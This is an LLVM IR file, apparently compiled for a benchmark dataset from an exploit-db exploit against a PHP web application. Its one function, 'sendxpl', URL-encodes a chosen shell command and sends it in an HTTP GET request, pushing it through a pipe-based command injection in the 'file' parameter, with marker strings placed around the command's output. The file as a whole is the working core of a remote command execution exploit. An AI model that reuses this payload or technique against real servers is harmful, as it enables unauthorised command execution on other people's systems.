; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_25904.c_sendxpl.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_25904.c_sendxpl.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@CMDB = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"0123456789abcdef\00", align 1
@.str.1 = private unnamed_addr constant [278 x i8] c"GET %s?file=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\0AConnection: Keep-Alive\0AAccept: text/html, image/jpeg, image/png, text/*, image/*, */*\0AAccept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\0AAccept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\0AAccept-Language: en\0AHost: %s\0A\0A\00", align 1
@BANSTART = common dso_local global i8* null, align 8
@BANSTOP = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sendxpl(i32* %0, i8** %1, i32 %2) #0 {
  %4 = alloca i32*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32* %0, i32** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 %2, i32* %6, align 4
  %15 = load i32, i32* @CMDB, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %7, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %8, align 8
  %19 = load i32, i32* @CMDB, align 4
  %20 = mul nsw i32 %19, 3
  %21 = zext i32 %20 to i64
  %22 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %9, align 8
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8** %11, align 8
  store i32 0, i32* %13, align 4
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 3
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @strlen(i8* %25)
  store i32 %26, i32* %14, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 3
  %29 = load i8*, i8** %28, align 8
  %30 = load i32, i32* %14, align 4
  %31 = call i32 @strncpy(i8* %18, i8* %29, i32 %30)
  store i32 0, i32* %12, align 4
  br label %32

32:                                               ; preds = %110, %3
  %33 = load i32, i32* %12, align 4
  %34 = load i32, i32* %14, align 4
  %35 = icmp slt i32 %33, %34
  br i1 %35, label %36, label %113

36:                                               ; preds = %32
  %37 = load i32, i32* %12, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %18, i64 %38
  %40 = load i8, i8* %39, align 1
  store i8 %40, i8* %10, align 1
  %41 = load i8, i8* %10, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp sge i32 %42, 97
  br i1 %43, label %44, label %48

44:                                               ; preds = %36
  %45 = load i8, i8* %10, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp sle i32 %46, 122
  br i1 %47, label %76, label %48

48:                                               ; preds = %44, %36
  %49 = load i8, i8* %10, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp sge i32 %50, 65
  br i1 %51, label %52, label %56

52:                                               ; preds = %48
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp sle i32 %54, 90
  br i1 %55, label %76, label %56

56:                                               ; preds = %52, %48
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp sge i32 %58, 48
  br i1 %59, label %60, label %64

60:                                               ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sle i32 %62, 57
  br i1 %63, label %76, label %64

64:                                               ; preds = %60, %56
  %65 = load i8, i8* %10, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 45
  br i1 %67, label %76, label %68

68:                                               ; preds = %64
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp eq i32 %70, 95
  br i1 %71, label %76, label %72

72:                                               ; preds = %68
  %73 = load i8, i8* %10, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp eq i32 %74, 46
  br i1 %75, label %76, label %82

76:                                               ; preds = %72, %68, %64, %60, %52, %44
  %77 = load i8, i8* %10, align 1
  %78 = load i32, i32* %13, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %13, align 4
  %80 = sext i32 %78 to i64
  %81 = getelementptr inbounds i8, i8* %22, i64 %80
  store i8 %77, i8* %81, align 1
  br label %109

82:                                               ; preds = %72
  %83 = load i32, i32* %13, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %13, align 4
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %22, i64 %85
  store i8 37, i8* %86, align 1
  %87 = load i8*, i8** %11, align 8
  %88 = load i8, i8* %10, align 1
  %89 = sext i8 %88 to i32
  %90 = ashr i32 %89, 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %87, i64 %91
  %93 = load i8, i8* %92, align 1
  %94 = load i32, i32* %13, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %13, align 4
  %96 = sext i32 %94 to i64
  %97 = getelementptr inbounds i8, i8* %22, i64 %96
  store i8 %93, i8* %97, align 1
  %98 = load i8*, i8** %11, align 8
  %99 = load i8, i8* %10, align 1
  %100 = sext i8 %99 to i32
  %101 = and i32 %100, 15
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %98, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = load i32, i32* %13, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %13, align 4
  %107 = sext i32 %105 to i64
  %108 = getelementptr inbounds i8, i8* %22, i64 %107
  store i8 %104, i8* %108, align 1
  br label %109

109:                                              ; preds = %82, %76
  br label %110

110:                                              ; preds = %109
  %111 = load i32, i32* %12, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %12, align 4
  br label %32

113:                                              ; preds = %32
  %114 = load i32, i32* %13, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %22, i64 %115
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %6, align 4
  %118 = icmp eq i32 %117, 1
  br i1 %118, label %119, label %130

119:                                              ; preds = %113
  %120 = load i32*, i32** %4, align 8
  %121 = load i8**, i8*** %5, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 2
  %123 = load i8*, i8** %122, align 8
  %124 = load i8*, i8** @BANSTART, align 8
  %125 = load i8*, i8** @BANSTOP, align 8
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 1
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @fprintf(i32* %120, i8* getelementptr inbounds ([278 x i8], [278 x i8]* @.str.1, i64 0, i64 0), i8* %123, i8* %124, i8* %22, i8* %125, i8* %128)
  br label %130

130:                                              ; preds = %119, %113
  %131 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %131)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @fprintf(i32*, i8*, i8*, i8*, i8*, i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
